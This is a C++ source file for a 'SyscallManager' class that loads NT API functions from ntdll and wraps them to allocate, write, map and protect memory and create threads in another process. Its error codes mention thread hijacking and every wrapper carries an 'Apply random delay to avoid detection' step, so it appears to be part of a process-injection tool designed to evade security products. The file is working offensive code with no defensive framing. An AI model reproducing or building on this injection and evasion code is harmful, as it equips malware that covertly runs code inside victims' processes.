#include "fixed_syscall_manager.h"

// Implementation of SyscallManager class
SyscallManager::SyscallManager(ErrorHandler* errorHandler, NameRandomizer* nameRandomizer)
    : m_errorHandler(errorHandler), m_nameRandomizer(nameRandomizer), m_ntdllHandle(NULL) {
    
    // Initialize function pointers to NULL
    m_NtCreateThreadEx = NULL;
    m_NtAllocateVirtualMemory = NULL;
    m_NtProtectVirtualMemory = NULL;
    m_NtWriteVirtualMemory = NULL;
    m_NtReadVirtualMemory = NULL;
    m_NtCreateSection = NULL;
    m_NtMapViewOfSection = NULL;
    m_NtUnmapViewOfSection = NULL;
    m_NtFlushInstructionCache = NULL;
}

SyscallManager::~SyscallManager() {
    // No need to free the NTDLL handle as it's loaded by the system
}

bool SyscallManager::Initialize() {
    // Get handle to ntdll.dll
    m_ntdllHandle = GetModuleHandleA("ntdll.dll");
    if (m_ntdllHandle == NULL) {
        m_errorHandler->SetLastWinError(ErrorCode::SYSCALL_FAILED, "Failed to get handle to ntdll.dll");
        return false;
    }
    
    // Get function addresses
    m_NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddressSafe(m_ntdllHandle, "NtCreateThreadEx");
    m_NtAllocateVirtualMemory = (NtAllocateVirtualMemoryFunc)GetProcAddressSafe(m_ntdllHandle, "NtAllocateVirtualMemory");
    m_NtProtectVirtualMemory = (NtProtectVirtualMemoryFunc)GetProcAddressSafe(m_ntdllHandle, "NtProtectVirtualMemory");
    m_NtWriteVirtualMemory = (NtWriteVirtualMemoryFunc)GetProcAddressSafe(m_ntdllHandle, "NtWriteVirtualMemory");
    m_NtReadVirtualMemory = (NtReadVirtualMemoryFunc)GetProcAddressSafe(m_ntdllHandle, "NtReadVirtualMemory");
    m_NtCreateSection = (NtCreateSectionFunc)GetProcAddressSafe(m_ntdllHandle, "NtCreateSection");
    m_NtMapViewOfSection = (NtMapViewOfSectionFunc)GetProcAddressSafe(m_ntdllHandle, "NtMapViewOfSection");
    m_NtUnmapViewOfSection = (NtUnmapViewOfSectionFunc)GetProcAddressSafe(m_ntdllHandle, "NtUnmapViewOfSection");
    m_NtFlushInstructionCache = (NtFlushInstructionCacheFunc)GetProcAddressSafe(m_ntdllHandle, "NtFlushInstructionCache");
    
    // Check if all functions were found
    if (!m_NtCreateThreadEx || !m_NtAllocateVirtualMemory || !m_NtProtectVirtualMemory ||
        !m_NtWriteVirtualMemory || !m_NtReadVirtualMemory || !m_NtCreateSection ||
        !m_NtMapViewOfSection || !m_NtUnmapViewOfSection || !m_NtFlushInstructionCache) {
        m_errorHandler->SetLastWinError(ErrorCode::SYSCALL_FAILED, "Failed to get address of one or more NT API functions");
        return false;
    }
    
    return true;
}

bool SyscallManager::CreateRemoteThread(ProcessHandle processHandle, MemoryAddress startAddress, 
                                       MemoryAddress parameter, ThreadHandle* threadHandle) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(10, 50);
    
    // Create thread in target process
    NTSTATUS status = m_NtCreateThreadEx(
        threadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        processHandle,
        startAddress,
        parameter,
        0,
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::THREAD_HIJACK_FAILED, "Failed to create remote thread");
        return false;
    }
    
    return true;
}

bool SyscallManager::AllocateVirtualMemory(ProcessHandle processHandle, MemoryAddress* baseAddress, 
                                          MemorySize size, DWORD allocationType, DWORD protection) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(5, 30);
    
    // Allocate memory in target process
    NTSTATUS status = m_NtAllocateVirtualMemory(
        processHandle,
        baseAddress,
        0,
        &size,
        allocationType,
        protection
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::MEMORY_ALLOCATION_FAILED, "Failed to allocate virtual memory");
        return false;
    }
    
    return true;
}

bool SyscallManager::ProtectVirtualMemory(ProcessHandle processHandle, MemoryAddress* baseAddress, 
                                         MemorySize* size, DWORD newProtection, DWORD* oldProtection) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(5, 20);
    
    // Change memory protection in target process
    NTSTATUS status = m_NtProtectVirtualMemory(
        processHandle,
        baseAddress,
        size,
        newProtection,
        oldProtection
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::MEMORY_PROTECTION_FAILED, "Failed to change memory protection");
        return false;
    }
    
    return true;
}

bool SyscallManager::WriteVirtualMemory(ProcessHandle processHandle, MemoryAddress baseAddress, 
                                       const void* buffer, MemorySize size, MemorySize* bytesWritten) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(5, 25);
    
    // Write memory to target process
    NTSTATUS status = m_NtWriteVirtualMemory(
        processHandle,
        baseAddress,
        (PVOID)buffer,
        size,
        bytesWritten
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::MEMORY_WRITE_FAILED, "Failed to write virtual memory");
        return false;
    }
    
    return true;
}

bool SyscallManager::ReadVirtualMemory(ProcessHandle processHandle, MemoryAddress baseAddress, 
                                      void* buffer, MemorySize size, MemorySize* bytesRead) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(5, 25);
    
    // Read memory from target process
    NTSTATUS status = m_NtReadVirtualMemory(
        processHandle,
        baseAddress,
        buffer,
        size,
        bytesRead
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::MEMORY_WRITE_FAILED, "Failed to read virtual memory");
        return false;
    }
    
    return true;
}

bool SyscallManager::CreateSection(SectionHandle* sectionHandle, DWORD desiredAccess, 
                                  MemorySize maximumSize, DWORD pageProtection, DWORD allocationAttributes) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(5, 30);
    
    // Create section object
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = maximumSize;
    
    NTSTATUS status = m_NtCreateSection(
        sectionHandle,
        desiredAccess,
        NULL,
        &sectionSize,
        pageProtection,
        allocationAttributes,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::SECTION_CREATION_FAILED, "Failed to create section");
        return false;
    }
    
    return true;
}

bool SyscallManager::MapViewOfSection(SectionHandle sectionHandle, ProcessHandle processHandle, 
                                     MemoryAddress* baseAddress, MemorySize commitSize, 
                                     MemorySize* viewSize, DWORD allocationType, DWORD protection) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(5, 30);
    
    // Map view of section into target process
    LARGE_INTEGER sectionOffset;
    sectionOffset.QuadPart = 0;
    
    NTSTATUS status = m_NtMapViewOfSection(
        sectionHandle,
        processHandle,
        baseAddress,
        0,
        commitSize,
        &sectionOffset,
        viewSize,
        ViewShare,
        allocationType,
        protection
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::MEMORY_ALLOCATION_FAILED, "Failed to map view of section");
        return false;
    }
    
    return true;
}

bool SyscallManager::UnmapViewOfSection(ProcessHandle processHandle, MemoryAddress baseAddress) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(5, 20);
    
    // Unmap view of section from target process
    NTSTATUS status = m_NtUnmapViewOfSection(
        processHandle,
        baseAddress
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::MEMORY_ALLOCATION_FAILED, "Failed to unmap view of section");
        return false;
    }
    
    return true;
}

bool SyscallManager::FlushInstructionCache(ProcessHandle processHandle, MemoryAddress baseAddress, MemorySize size) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(5, 15);
    
    // Flush instruction cache
    NTSTATUS status = m_NtFlushInstructionCache(
        processHandle,
        baseAddress,
        size
    );
    
    if (!NT_SUCCESS(status)) {
        m_errorHandler->SetError(ErrorCode::EXECUTION_FAILED, "Failed to flush instruction cache");
        return false;
    }
    
    return true;
}

std::string SyscallManager::GetLastErrorMessage() const {
    return m_errorHandler->GetLastErrorMessage();
}

void* SyscallManager::GetProcAddressSafe(HMODULE module, const char* procName) {
    // Apply random delay to avoid detection
    m_nameRandomizer->ApplyRandomDelay(1, 10);
    
    // Get function address
    return (void*)GetProcAddress(module, procName);
}
